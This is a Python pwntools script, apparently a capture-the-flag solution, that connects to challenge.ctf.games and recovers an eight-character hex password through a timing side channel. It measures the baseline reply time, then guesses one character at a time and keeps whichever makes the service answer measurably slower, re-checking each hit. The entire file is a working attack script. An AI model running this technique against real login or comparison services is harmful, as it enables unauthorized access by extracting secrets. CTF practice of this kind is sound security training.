#!/usr/bin/env python3
import time

from pwn import remote

PASSWORD_LENGTH = 8

r = remote('challenge.ctf.games', 30636)


def benchmark() -> float:
    times = []
    print('Benchmarking response time: ', end='', flush=True)
    for _ in range(5):
        before = time.time()
        r.sendline('X'.encode())
        r.recvuntil(b': ')
        times.append(time.time() - before)
        print('.', end='', flush=True)
    print()

    average = round(sum(times) / len(times), 4)
    print(f'average response time: {average:.4f}')
    return average


def send_payload(payload: str) -> float:
    before = time.time()
    r.sendline(payload.encode())
    r.recvuntil(b': ')
    return round(time.time() - before, 4)


def main():
    r.recvuntil(b': ')
    average = benchmark()
    # 0.1 for the right length + first letter; 0.05 is half-way between 0.1 steps
    diff_threshold = round(average + 0.1 + 0.05, 4)
    password = ''
    for idx in range(PASSWORD_LENGTH):
        print(f'Current threshold: {diff_threshold:.4f}')
        for char in 'abcdef0123456789':
            payload = password + char
            payload += '0' * (PASSWORD_LENGTH - len(payload))  # padding
            diff = send_payload(payload)
            print(f'Password "{payload}" took {diff:.4f} to get a reply')
            if diff > diff_threshold:
                if len(password) + 1 == PASSWORD_LENGTH:  # if this was the last character
                    if b'flag' in (data := r.recvrepeat(average * 2)):
                        password += char
                        print(f'Got password: "{password}"')
                        print(f'Data: {data}')
                        return
                print('Making sure we got the right char...')
                verify_diff = send_payload(payload)
                if verify_diff > diff_threshold:
                    password += char
                    print(f'Got it! Char: {char}, Password: "{password + '_' * (PASSWORD_LENGTH - len(password))}"')
                    diff_threshold = round(diff_threshold + 0.1, 4)
                else:
                    print(f'That was a false positive (verification only took {verify_diff:.4f}), ignoring it..')


if __name__ == '__main__':
    main()
